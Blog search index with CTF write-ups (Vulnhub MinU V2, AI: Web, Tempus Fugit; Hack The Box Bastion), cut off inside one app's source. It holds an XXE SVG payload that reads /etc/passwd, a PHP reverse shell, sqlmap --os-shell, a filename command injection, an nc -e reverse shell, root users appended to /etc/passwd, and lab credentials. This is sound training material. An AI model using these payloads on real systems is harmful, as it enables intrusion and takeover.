<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2020/07/14/minu2-vulnhub/"/>
      <url>/2020/07/14/minu2-vulnhub/</url>
      
        <content type="html"><![CDATA[<hr><p>layout:    post<br>title:      “Vulnhub - MinU V2”<br>date:       2019-07-26<br>author:     “D4mianwayne”<br>tag:      nmap, ctf, vulnhub</p><h2 id="category-Vulnhub"><a href="#category-Vulnhub" class="headerlink" title="category: Vulnhub"></a>category: Vulnhub</h2><p>Writeup of MinU V2 from Vulnhub.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Scanning the netwrk reveals we have only two ports open <strong>3306</strong> which is default port for my MySQL and <strong>22</strong> which is default port for SSH. But with the version scanning and <code>-A</code> argument we see that nmap has a “?” symbol on the ned of mysql which means that it is not sure that the service running on port <strong>3306</strong> is MySQL or nor. But the further scan reveals it has a HTML page.</p><pre><code>robin@oracle:~$ nmap -sV -sC -A -p- -T5 192.168.43.172 Starting Nmap 7.60 ( https://nmap.org ) at 2019-07-26 11:51 ISTNmap scan report for minuv2 (192.168.43.172)Host is up (0.00010s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: |   3072 82:33:25:61:27:97:ea:4a:49:f5:76:a3:33:1c:ae:2b (RSA)|   256 ed:ca:f6:b9:b5:39:32:89:d0:a3:36:94:82:04:4a:e8 (ECDSA)|_  256 26:79:15:2e:be:93:02:41:04:c9:ea:e8:05:16:d1:83 (EdDSA)3306/tcp open  mysql?| fingerprint-strings: |   GenericLines: |     HTTP/1.1 400 Bad Request|     Content-Type: text/plain|     Transfer-Encoding: chunked|     Request|   GetRequest, HTTPOptions: |     HTTP/1.0 404 Not Found|     X-Powered-By: Kemal|     Content-Type: text/html|     &lt;!DOCTYPE html&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;style type=&quot;text/css&quot;&gt;|     body { text-align:center;font-family:helvetica,arial;font-size:22px;|     color:#888;margin:20px}|     max-width: 579px; width: 100%; }|     {margin:0 auto;width:500px;text-align:left}|     &lt;/style&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h2&gt;Kemal doesn&#39;t know this way.&lt;/h2&gt;|_    &lt;svg id=&quot;svg&quot; version=&quot;1.1&quot; width=&quot;400&quot; height=&quot;400&quot; viewBox=&quot;0 0 400 400&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; &gt;&lt;g id=&quot;svgg&quot;&gt;&lt;path id=&quot;path0&quot; d=&quot;M262.800 99.200 L 262.800 150.400 265.461 150.400 L 268.121 150.400 267.864 144.300 C 267.722 140.945,267.510 120.110,267.391 98.000 C 267.273 75.890,267.074 55.595,266.948 52.900 L 266.719 48.000 264.760 48.000 L 262.800 48.000 262.800 99.200 M160.800 290.800 C 160.800 291.301,161.224 291.301,162.000|_mysql-info: ERROR: Script execution failed (use -d to debug)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.60%I=7%D=7/26%Time=5D3A9C06%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,6D,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tSF:ext/plain\r\nTransfer-Encoding:\x20chunked\r\n\r\n10\r\n400\x20Bad\x20RSF:equest\n\r\n0\r\n\r\n&quot;)%r(GetRequest,642C,&quot;HTTP/1\.0\x20404\x20Not\x20FSF:ound\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\n\r\n\x2SF:0\x20&lt;!DOCTYPE\x20html&gt;\n\x20\x20&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\x20\xSF:20&lt;style\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20body\x20{\x20text-alignSF::center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x20\x20\xSF:20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-width:\xSF:20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:0\x20auSF:to;width:500px;text-align:left}\n\x20\x20\x20\x20&lt;/style&gt;\n\x20\x20&lt;/heSF:ad&gt;\n\x20\x20&lt;body&gt;\n\x20\x20\x20\x20&lt;h2&gt;Kemal\x20doesn&#39;t\x20know\x20thSF:is\x20way\.&lt;/h2&gt;\n\x20\x20\x20\x20&lt;svg\x20id=\&quot;svg\&quot;\x20version=\&quot;1\.1\SF:&quot;\x20width=\&quot;400\&quot;\x20height=\&quot;400\&quot;\x20viewBox=\&quot;0\x200\x20400\x20400\SF:&quot;\x20xmlns=\&quot;http://www\.w3\.org/2000/svg\&quot;\x20xmlns:xlink=\&quot;http://wwwSF:\.w3\.org/1999/xlink\&quot;\x20&gt;&lt;g\x20id=\&quot;svgg\&quot;&gt;&lt;path\x20id=\&quot;path0\&quot;\x20dSF:=\&quot;M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461\x20150SF:\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\x20267\SF:.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\x20267\.SF:273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x20266\.719SF:\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\x20262\.SF:800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\.301,16SF:1\.224\x20291\.301,162\.000&quot;)%r(HTTPOptions,642C,&quot;HTTP/1\.0\x20404\x20NSF:ot\x20Found\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\nSF:\r\n\x20\x20&lt;!DOCTYPE\x20html&gt;\n\x20\x20&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x2SF:0\x20\x20&lt;style\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20body\x20{\x20texSF:t-align:center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x2SF:0\x20\x20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-wSF:idth:\x20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:SF:0\x20auto;width:500px;text-align:left}\n\x20\x20\x20\x20&lt;/style&gt;\n\x20\SF:x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n\x20\x20\x20\x20&lt;h2&gt;Kemal\x20doesn&#39;t\x20knoSF:w\x20this\x20way\.&lt;/h2&gt;\n\x20\x20\x20\x20&lt;svg\x20id=\&quot;svg\&quot;\x20version=SF:\&quot;1\.1\&quot;\x20width=\&quot;400\&quot;\x20height=\&quot;400\&quot;\x20viewBox=\&quot;0\x200\x20400\SF:x20400\&quot;\x20xmlns=\&quot;http://www\.w3\.org/2000/svg\&quot;\x20xmlns:xlink=\&quot;httSF:p://www\.w3\.org/1999/xlink\&quot;\x20&gt;&lt;g\x20id=\&quot;svgg\&quot;&gt;&lt;path\x20id=\&quot;path0SF:\&quot;\x20d=\&quot;M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461SF:\x20150\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\SF:x20267\.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\xSF:20267\.273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x202SF:66\.719\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\xSF:20262\.800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\SF:.301,161\.224\x20291\.301,162\.000&quot;);Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 94</code></pre><h1 id="HTTP-Enumeration-and-SVG-XXE-LFI"><a href="#HTTP-Enumeration-and-SVG-XXE-LFI" class="headerlink" title="HTTP Enumeration and SVG XXE LFI"></a>HTTP Enumeration and SVG XXE LFI</h1><p>Checking the webpage at <code>http://192.168.43.172:3306</code> it has a webpage as analyzed by nmap. But nothing much was there, running gobuster wuth defined file extensions like html, php, xml gives us a `upload.html which turns out to be a upload service but only for SVGs.</p><p><img src="/img/minu2/gobuster.png" alt></p><p>At first, I thought we have to upload the reverse shell by faking up the header of file but searching through the internet gives us a article <a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/" target="_blank" rel="noopener">SVG LFI</a> which wasa CTF challenge back in 2016. So crafting our payload:-</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE svg [&lt;!ENTITY output SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;xxe&gt;&amp;output;&lt;/xxe&gt;&lt;/svg&gt;</code></pre><p><img src="/img/minu2/etcpass.png" alt></p><p>This will land us to another page saying <strong>Upload OK</strong> and checking the source of the page gives the content of <code>/etc/passwd</code> file. Analyzing it for a bit we get to see a entry of user <code>employer</code> who has a <code>/bin/ash</code> as it’s shell. Trying to chck for multiple things like mail, logs etc. I thought of checking <code>.bash_history</code> for a second but it was a dead end. Then I tried to open <code>.ash_history</code> which has following contents:-</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE svg [&lt;!ENTITY output SYSTEM &quot;file:////home/employee/.ash_history&quot;&gt;]&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;xxe&gt;useradd -D bossdonttrackme -p superultrapass3exit&lt;/xxe&gt;&lt;/svg&gt;Upload OK</code></pre><p>Hence, we got a password for user <code>employer</code>.</p><h1 id="SSH-Login-and-Root-Flag"><a href="#SSH-Login-and-Root-Flag" class="headerlink" title="SSH Login and Root Flag"></a>SSH Login and Root Flag</h1><p>Using above password, we logged in the minu2 machine via SSH as <code>employer</code>. So, starting off with basic enumeration I tried <code>sudo -l</code> but got a error. So, I tried <code>find / -perm -u=s -type f 2&gt;/dev/null</code> which shows we can use <strong>micro</strong> and <strong>bissuid</strong>. This was time consuming since we have nothing more than a CLI editor and none of the files having any relevant informations. So, I thought that we can access the <code>/etc/passwd</code> so I tried to edit with micro with <code>cat /etc/passwd | micro</code>. Going to the bottom we add a user since we can use su which can be use to elevate users.<br>Using <code>openssl -passwd -1 -salt new 123</code> gives us a hash of password so editing the file by adding this line at end <code>robin:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:root:/bin/ash</code>. But here we gwt another problem because there is no file like <code>/bin/ash</code> so to try again I chnaged it to <code>robin:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:root:/bin/ashh</code> which succesfully gives root shell.</p><p><img src="/img/minu2/root.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box - Bastion</title>
      <link href="/2019/09/10/bastion/"/>
      <url>/2019/09/10/bastion/</url>
      
        <content type="html"><![CDATA[<p>Write-up for Bastion from hackthebox.eu </p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with nmap we use <code>nmap -sV -sC -A 10.10.10.134</code> shows <code>22</code>, <code>139</code>, <code>445</code>, <code>135</code> are open.<br>Basically, we gonna use <strong>smbclient</strong> for further enumeration.</p><p><img src="/img/bastion/nmap.png" alt></p><h1 id="SMB-Service-Enumeration"><a href="#SMB-Service-Enumeration" class="headerlink" title="SMB Service Enumeration"></a>SMB Service Enumeration</h1><p>Using <code>smbclient -L //10.10.10.134</code> shows there are 4 folders on the network drive. Again, using smbclinet for that result in error for every folder excepyt <strong>Backups</strong>.</p><p>Using, <code>smbclient //10.10.10.134/Backups -U root</code> we can access the files which typically contains <code>notes.txt</code> , <code>nmap-test-file</code> , <code>SDTC56B</code> and a folder named <code>WindowsImageBackup</code>.</p><p><img src="/img/bastion/notes.png" alt></p><h4 id="Checking-Files"><a href="#Checking-Files" class="headerlink" title="Checking Files"></a>Checking Files</h4><p>The file named <code>notes.txt</code> has following contents:-</p><blockquote><p>Sysadmins: please don’t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.</p></blockquote><h4 id="Mounting-the-Shared-Drive’s-Folder"><a href="#Mounting-the-Shared-Drive’s-Folder" class="headerlink" title="Mounting the Shared Drive’s Folder"></a>Mounting the Shared Drive’s Folder</h4><p>Since we want to take a closer look in it <strong>Backups</strong> folder, the best way to do that is to mount that drive via inbuilt <code>mount</code> program.<br>Using <code>mount -t cifs //10.10.10.134/Backups -o user=guest,password= /tmp/mnt</code> we can mount the drive it took sometime since the network was slow.</p><p><img src="/img/bastion/mountdrive.png" alt></p><h4 id="Mounting-the-vhd-files"><a href="#Mounting-the-vhd-files" class="headerlink" title="Mounting the .vhd files"></a>Mounting the .vhd files</h4><p>Looking for files in Backups shows that there was a <strong>.vhd</strong> file, since as previously suggested in <code>notes.txt</code> we not gonna get the whole .vhd file instead of that we will mount it using <code>guestmount</code> package tool.<br>Using <code>guestmount --add /mnt/backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd</code> we ca succesfully mount the vhd file for further enumeration.<br>Network was kinda slow it took ~15 minutes.</p><h1 id="SSH-Password-Recovery-and-SSH-Login"><a href="#SSH-Password-Recovery-and-SSH-Login" class="headerlink" title="SSH Password Recovery and SSH Login"></a>SSH Password Recovery and SSH Login</h1><p>There were a lot of <strong>.xml</strong> files but as we do in linux machine enumeration we head over to <code>System32/config</code> and using one of the known tools for dumping the password is <code>samdump2</code>and with <code>samdump2 SYSTEM SAM</code> we can dump the passwords aka NTLM hash of users password.</p><p><img src="/img/bastion/passwordfile.png" alt></p><p>Since we got the NTLM hash, usinh <a href="https://hashkiller.co.uk/Cracker/NTLM" target="_blank" rel="noopener">Hashkiller</a> we found the hash value that is <code>buraeulampje</code>.</p><blockquote><p>26112010952d963c8dc4217daec986d9                                                    bureaulampje</p></blockquote><p>Using above password for user <strong>L4mpje</strong> we successfully logged into the machine.</p><p><img src="/img/bastion/sshlogin.png" alt></p><h1 id="User-Flag-and-Root-Password"><a href="#User-Flag-and-Root-Password" class="headerlink" title="User Flag and Root Password"></a>User Flag and Root Password</h1><p>Though, I spent quite a few time in finding user flag thrn I used <code>dir /s *user.txt*</code>, I saw the password is in <code>/L4mpje/Desktop</code>, hence we obtain the user flag.</p><p><img src="/img/bastion/user.png" alt></p><p>Time to enumerate for root, I saw mRemoteNG and speaking of it, mRemoteng stores user’s password in a config file so time to get it.</p><p>So, I went to <code>L4mpje/AppData/mRemoteng</code> to et the <code>config.ini</code> we can see administartor password looks base64 encoded encrypted data.<br>After obtaining that ciphertext I started searching for tools for cracking that ciphertext. Lckly, I found a github repo with <a href="https://github.com/kmahyyg/mremoteng-decrypt/" target="_blank" rel="noopener">mremoteng-decrypt</a>, using the python file and <code>python3 mremoteng-decrypt -s &lt;hash&gt;</code> we can get the password of Administrator i.e. <code>thXLHM96BeKL0ER2</code>.</p><p><img src="/img/bastion/password.png" alt></p><p>After that I tried <code>rnas /users:Administrator CMD.exe</code> but it didn’t worked so I tried ssh again and we were logged in as Administrator in the machine. So going to <code>Users/Administrator/Desktop</code> we obtained our <code>root.txt</code>.</p><p><img src="/img/bastion/root.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows, htb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - AI: Web</title>
      <link href="/2019/08/27/ai/"/>
      <url>/2019/08/27/ai/</url>
      
        <content type="html"><![CDATA[<p>This is a writeup for <a href="https://www.vulnhub.com/entry/ai-web-1,353/" target="_blank" rel="noopener">AI:Web</a> by <a href="https://twitter.com/@arif_xpress" target="_blank" rel="noopener">arif</a> from Vulnhub.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with the nmap and using <code>nmap -sV -sC -A -p- -T4 192.168.43.135</code>, we can see that it has only one port open i.e. HTTP or 80.</p><p><img src="/img/ai/nmap.png" alt></p><h1 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h1><p>Checking the HTTP port, we can see that it has a very basic homepage.</p><p><img src="/img/ai/http.png" alt></p><p>Now, from the nmap scan we knew that it has a <code>robots.txt</code>, let’s check it.</p><p><img src="/img/ai/robots.png" alt></p><p><code>robots.txt</code> had following contents:-</p><pre><code>User-agent: *Disallow: Disallow: /m3diNf0/Disallow: /se3reTdir777/uploads/</code></pre><p>Now, let’s try the <code>/m3diNf0</code> directory but apparently both of them gave the same response <strong>You do not have the permission to view this</strong>.</p><p><img src="/img/ai/noperm.png" alt></p><p>Now, using uniscan I found that there is a <code>info.php</code> but it was not useful since, since it only contains some basic information, but still what worthy of attenton was the following line:-</p><p><img src="/img/ai/docroot.png" alt></p><p>Going over <code>/se3reTdir777</code> shows a input for to retrieve the data/credentials by entering the ID.</p><p><img src="/img/ai/login.png" alt></p><p>Since after entering something like <code>&#39; 0R 1=1</code> didn’t worked as I thought it was SQLi, then I tried <code>1,2,3,4....</code> that leaked the admin, ID and other data.</p><p><img src="/img/ai/leak.png" alt></p><h1 id="SQL-Injection-and-Reverse-Shell"><a href="#SQL-Injection-and-Reverse-Shell" class="headerlink" title="SQL Injection and Reverse Shell"></a>SQL Injection and Reverse Shell</h1><p>I tried to use sqlmap, but the url didn’t had any vulnerable parameter so we needed the whole request to attack the database. Thanks to <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">mzfr</a> for pointing it out. I captured the request and saved it in a file and used <code>sqlmap -r new.txt --dbs</code> and started it.</p><pre><code>POST /se3reTdir777/ HTTP/1.1Host: 192.168.43.135User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 38Connection: closeReferer: http://192.168.43.135/se3reTdir777/Upgrade-Insecure-Requests: 1uid=1%2C2%2C3%2C4....&amp;Operation=Submit</code></pre><p><img src="/img/ai/sqldata.png" alt></p><p>Once the scan will over, we can see it has two databases</p><p><img src="/img/ai/sqlmap.png" alt></p><p>Checking the tables and thier respective columns gave some data, though they were kinda useless in our condition since there was no other port beside 80. </p><p><img src="/img/ai/crdentials.png" alt></p><p>Now, as for now I was a little clueless since we successfully exploited the SQL Injection vulnerabilty, so I tried <code>--os-shell</code> argument to spawn an instance of the shell. That worked, now we knew that it is work on PHP, selecting php as an option and the bruteforce option, after that entering the root directory we found on earlier <strong>HTTP Enumeration</strong>. </p><p><img src="/img/ai/shell.png" alt></p><p>So, there are already uploaded files in the folder let’s try to access files, apparently one given a blank page, from other we can see an upload service:-</p><p><img src="/img/ai/uploaf.png" alt></p><p>As a php backend website, I quickly used the classic old reverse shell script and uploaded it, once it was uploaded, we started the listener and go to <code>/uploads/shell.php</code> start the daemon service to reverse callback the shell file spawning a shell.</p><blockquote><p>Note: Do `python -c ‘import pty; pty.spawn(“/bin/bash)’ to spawn a TTY shell.</p></blockquote><p><img src="/img/ai/reverseshell.png" alt></p><h5 id="Upload-file-contents"><a href="#Upload-file-contents" class="headerlink" title="Upload file contents"></a>Upload file contents</h5><p>One file has contents which can be seen and deduce that it is upload service.</p><p><img src="/img/ai/files.png" alt></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>Now, I started searching for SUID binaries but nothing, so I started searching for writable files and directory by using <code>find / -user www-data -writable f 2&gt;/dev/null</code>, which showed us that user <code>www-data</code> has write permission on <code>/etc/passwd</code>.</p><p><img src="/img/ai/passwd.png" alt></p><p><img src="/img/ai/permissions.png" alt></p><p>Recalling what we have done to MinUV2 from Vulnhub, let’s add a sudo user to the file, doing this <code>echo &quot;robin:sXuCKi7k3Xh/s:0:0::/root:/bin/bash&quot; &gt;&gt; /etc/passwd</code> which has a password <code>toor</code> :P</p><pre><code>echo &quot;robin:sXuCKi7k3Xh/s:0:0::/root:/bin/bash&quot; &gt;&gt; /etc/passwdsu robintoor</code></pre><p>Rooted, time for a flag:-</p><p><img src="/img/ai/root.png" alt></p><h5 id="Leaked-Username-and-Passwords"><a href="#Leaked-Username-and-Passwords" class="headerlink" title="Leaked Username and Passwords"></a>Leaked Username and Passwords</h5><p>Though only one user credentials were correct from <code>systemUser</code> database that was leaked from it which was <code>aiweb1pwn</code> though that user didn’t have any <strong>seen</strong> vulnerable configuration so that’s why we had to do this from user <code>www-data</code>.</p><p><img src="/img/ai/crdentials.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Tempus Fugit</title>
      <link href="/2019/08/26/tempus-fugit/"/>
      <url>/2019/08/26/tempus-fugit/</url>
      
        <content type="html"><![CDATA[<p>Writeup for <a href="https://www.vulnhub.com/entry/tempus-fugit-1,346/" target="_blank" rel="noopener">Tempus Fugit</a> by <a href="https://twitter.com/4ndr34z" target="_blank" rel="noopener">4ndr34z</a> and <a href="https://twitter.com/DCAU7" target="_blank" rel="noopener">DCUA7</a>.</p><h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>This machine had a internal network/machine that was our real target and it teaches you about how reconnaisance can often lead you to the vulnerable machine in a network.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with nmap, scanning with <code>nmap -sV -sC -A -p- 192.168.43.224</code> which shows that we have only one port open i.e. 80 aka HTTP. So, let’s check it.</p><p><img src="/img/TempusFugit/nmap.png" alt></p><h1 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h1><p>Going to the HTTP port gives a good looking UI having a upload feature which will be saved to their internal FTP network of the machine. Now, let’s try to upload something which might lead us to something nasty. But as a <strong>sanity check</strong> I tried to upload <code>.php</code> file but it only accepts <code>rtf</code> and <code>txt</code> files, since it wasn’t a windows machine any kind of <code>rtf</code> related exploit would be pointless.<br>Next I tried to intercept the traffic via Burp Suite, now as we can see the contents which was being rendered and the file name field, so as a <strong>sanity check</strong> again, I added <code>file.txt;ls</code> to check it’s listing the files from that folder or not, at this point <a href="https://twitter.com/DCAU7" target="_blank" rel="noopener">DCAU7</a> helped me. So, it was possible to do a command injection from the file field parameter, the command <code>nc &lt; hexencodedIP port -e sh&gt;</code> pointed out by the <a href="https://twitter.com/DCAU7" target="_blank" rel="noopener">DCAU7</a>, probably WAF was preventing the standdard IP from being executed in the same order it was supposed to.</p><p><img src="/img/TempusFugit/burp.png" alt></p><p>Starting the listener and executing that payload of ours, landed a reverse shell.</p><p><img src="/img/TempusFugit/tempus.png" alt></p><h1 id="First-Network-and-FTP-Enumeration"><a href="#First-Network-and-FTP-Enumeration" class="headerlink" title="First Network and FTP Enumeration"></a>First Network and FTP Enumeration</h1><p>The real fun started from here. We gained the shell as the root user on the alpine linux.</p><p>Yup, we are done. Successfully pwned Tempus Fugit, pretty easy, right? Hold your horses, let’s see what flag got for us, going to the <code>/root</code> folder which has a file named <code>message.txt</code> which say</p><p><img src="/img/TempusFugit/first.png" alt></p><blockquote><p>You’re not done yet! :-)</p></blockquote><p>So, we are not done, knew something was fishy. So, let’s enumerate the system. On the folder where our reverse shell landed us, it had a <code>main.py</code> which had following contents:-</p><p><img src="/img/TempusFugit/cmscreds.png" alt></p><p>Remember when we were told that it has a internal FTP server which was storing our uploaded files, from which I knew that we have to gain access to that FTP server, using <code>nsftp</code> which was the FTP package of Alpine, so using that the crdentials from the following script script</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> ftplib <span class="token keyword">import</span> FTP<span class="token keyword">import</span> subprocessUPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'upload'</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'txt'</span><span class="token punctuation">,</span> <span class="token string">'rtf'</span><span class="token punctuation">}</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"mofosecret"</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> defaults<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/&lt;path:path>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">catch_all</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>      cmd <span class="token operator">=</span> <span class="token string">'fortune -o'</span>      result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"&lt;h1>400 - Sorry. I didn't find what you where looking for.&lt;/h1> &lt;h2>Maybe this will cheer you up:&lt;/h2>&lt;h3>"</span><span class="token operator">+</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&lt;/h3>"</span>@app<span class="token punctuation">.</span>errorhandler<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">internal_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"&lt;h1>500?! - What are you trying to do here?!&lt;/h1>"</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'my-form.html'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"500.html"</span><span class="token punctuation">,</span> error <span class="token operator">=</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>           check <span class="token operator">=</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>           check <span class="token operator">=</span> check<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS               <span class="token keyword">return</span> check@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token operator">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token 